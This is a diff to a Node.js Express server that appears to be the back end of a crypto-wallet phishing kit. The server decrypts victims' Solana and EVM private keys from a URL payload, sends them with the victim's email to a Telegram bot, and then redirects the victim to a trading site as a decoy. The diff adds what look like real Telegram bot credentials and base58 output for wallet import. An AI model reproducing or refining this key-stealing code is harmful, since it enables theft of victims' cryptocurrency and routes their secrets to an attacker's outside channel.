@@ -1,32 +1,29 @@
 const express = require('express');
 const fetch = require('node-fetch');
 const crypto = require('crypto');
+const bs58 = require('bs58');
 const app = express();
 
-const TG_BOT = 'YOUR_BOT_TOKEN';
-const TG_CHAT = 'YOUR_CHAT_ID';
+const TG_BOT = '7641165749:AAFla0YZ3Z7PUViwZQaq8a0W2-ydT7n0bJc';
+const TG_CHAT = '7680513699';
 
 function decrypt(encrypted, bundleKey) {
   try {
     const [ivBase64, ciphertext] = encrypted.split(':');
-    if (!ivBase64 || !ciphertext) {
-      return 'INVALID_FORMAT';
-    }
+    if (!ivBase64 || !ciphertext) return 'INVALID_FORMAT';
     
     const iv = Buffer.from(ivBase64, 'base64');
     const key = Buffer.from(bundleKey, 'base64');
+    const encryptedBuffer = Buffer.from(ciphertext, 'base64');
     
-    // Pad IV to 16 bytes if needed
-    let paddedIV = iv;
-    if (iv.length < 16) {
-      paddedIV = Buffer.alloc(16);
-      iv.copy(paddedIV);
-    }
+    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
+    decipher.setAuthTag(encryptedBuffer.slice(-16));
     
-    const decipher = crypto.createDecipheriv('aes-256-cbc', key, paddedIV);
-    let decrypted = decipher.update(ciphertext, 'base64', 'utf8');
-    decrypted += decipher.final('utf8');
-    return decrypted;
+    let decrypted = decipher.update(encryptedBuffer.slice(0, -16));
+    decrypted = Buffer.concat([decrypted, decipher.final()]);
+    
+    // Convert to base58 for Solana/EVM
+    return bs58.encode(decrypted);
   } catch (e) {
     return 'DECRYPT_ERROR: ' + e.message;
   }
@@ -47,14 +44,14 @@ app.get('/data/:b64', async (req, res) => {
     const evmKeys = eBundles?.map(enc => decrypt(enc, data.bundle)) || [];
     
     const msg = `
-🚨 DECRYPTED KEYS
+🚨 PRIVATE KEYS
 
-Email: ${data.user?.email || 'N/A'}
+Email: ${data.user?.email}
 
-Solana Private Keys:
+Solana (base58):
 ${solKeys.join('\n')}
 
-EVM Private Keys:
+EVM (base58):
 ${evmKeys.join('\n')}
     `;
     
@@ -66,7 +63,6 @@ ${evmKeys.join('\n')}
     
     res.redirect('https://axiom.trade/discover');
   } catch (e) {
-    console.error(e);
     res.status(500).send('err');
   }
 });
